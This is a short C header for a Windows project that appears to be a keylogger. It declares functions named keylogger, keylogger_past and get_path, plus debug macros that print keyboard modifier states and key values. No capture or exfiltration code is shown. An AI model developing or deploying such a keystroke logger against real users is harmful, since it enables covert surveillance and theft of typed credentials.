#ifndef _HEADER_H
# define _HEADER_H

# include <Windows.h>
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
#include <VersionHelpers.h>


# define ENTRY printf(" ENTRY ");
# define ENTRY2 printf(" ENTRY2 ");
# define STATUS printf("%hd, %hd, %hd -", kb_status.ctrl, kb_status.alt_gr, kb_status.shift);
# define KEY_ printf("%hd ", key_value);
# define LINE printf(" %d ", __LINE__);

bool keylogger_past(char *path);
char *keylogger(void);

char *get_path(void);


#endif // _HEADER_H